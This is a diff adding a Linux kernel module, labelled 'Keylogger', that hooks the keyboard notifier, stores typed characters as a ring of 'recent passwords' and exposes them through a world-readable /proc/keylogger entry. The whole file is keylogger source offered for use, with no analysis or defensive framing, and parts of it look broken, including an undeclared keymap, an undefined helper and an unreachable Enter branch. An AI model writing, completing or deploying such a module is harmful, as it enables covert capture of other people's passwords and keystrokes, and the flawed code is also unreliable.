@@ -1,0 +1,107 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/keyboard.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+#include <linux/ctype.h>
+#include <linux/slab.h>
+#include <linux/input.h>
+#include <linux/jiffies.h>
+
+#define MAX 15
+#define PHS 100
+
+struct password_entry{
+        char password[MAX + 1];
+        bool valid;
+        unsigned long timestamp;
+};
+
+struct password_entry *password_history;
+int password_index = 0;
+
+int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param){
+        struct keyboard_notifier_param *param = _param;
+        struct input_dev *dev = param->dev;
+        struct input_event *event = param->event;
+
+        if(code == KBD_KEYCODE && event->type == EV_KEY && event->value ==1){
+                if(event->code < KEY_RESERVED){
+                        char c = keymap[event->code];
+                        if(isprint(c)){
+                                if(strlen(password_history[password_index].password) < MAX){
+                                        password_history[password_index].password[strlen(password_history[password_index].password)]=c;
+                                }
+                        }
+                }
+                else if (event->code == KEY_ENTER){
+                        password_history[password_index].valid = is_password_complex(password_history[password_index].password);
+                        password_history[password_index].timestamp = jiffies;
+                        password_index = (password_index +1) % PHS;
+                        memset(password_history[password_index].password, 0, sizeof(password_history[password_index].password));
+                }
+        }
+        return NOTIFY_OK;
+}
+
+static int proc_show(struct seq_file *m,void *v){
+        seq_printf(m, "Recent Passwords:\n");
+        int start_index = (password_index +1) % PHS;
+        for (int i=0;i<PHS;i++){
+                if(password_history[start_index].password[0] != '\0'){
+                        seq_printf(m, "%s - %s\n",password_history[start_index].password, password_history[start_index].valid ? "Valid" : "Invalid");
+                }
+                start_index = (start_index +1) % PHS;
+        }
+        return 0;
+}
+
+static int proc_open(struct inode *inode, struct file *file){
+        return single_open(file, proc_show, NULL);
+}
+
+static const struct file_operations proc_fops ={
+        .owner = THIS_MODULE,
+        .open = proc_open,
+        .read = seq_read,
+        .llseek = seq_lseek,
+        .release = single_release
+};
+
+struct notifier_block nb = {
+        .notifier_call = keyboard_notifier
+};
+
+static int __init keylogger_init(void){
+        password_history = kmalloc(sizeof(struct password_entry) * PHS, GFP_KERNEL);
+        if(!password_history) {
+                printk(KERN_ERR "Failed to allocate memory for password history\n");
+                return -ENOMEM;
+        }
+
+        for(int i=0;i<PHS;i++){
+                memset(password_history[i].password,0,sizeof(password_history[i].password));
+                password_history[i].valid = false;
+        }
+
+        register_keyboard_notifier(&nb);
+
+        proc_create("keylogger", 0, NULL, &proc_fops);
+        printk(KERN_INFO "Keylogger module loaded\n");
+        return 0;
+}
+
+static void __exit keylogger_exit(void){
+        remove_proc_entry("keylogger", NULL);
+        unregister_keyboard_notifier(&nb);
+
+        kfree(password_history);
+        printk(KERN_INFO "Keylogger module unloaded\n");
+}
+
+module_init(keylogger_init);
+module_exit(keylogger_exit);
+
+MODULE_AUTHOR("Cole Devorak");
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("Keylogger");
